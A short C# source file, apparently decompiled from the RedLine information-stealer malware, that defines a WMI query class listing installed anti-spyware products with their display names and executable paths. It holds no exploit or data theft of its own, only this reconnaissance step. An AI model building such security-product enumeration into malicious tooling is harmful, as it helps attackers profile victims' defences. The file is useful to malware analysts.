namespace RedLine.Models.WMI
{
	public class WmiAntiSpyWareQuery : WmiQueryBase
	{
		public WmiAntiSpyWareQuery()
			: base("AntiSpyWareProduct", null, new string[2]
			{
				"displayName",
				"pathToSignedProductExe"
			})
		{
		}
	}
}
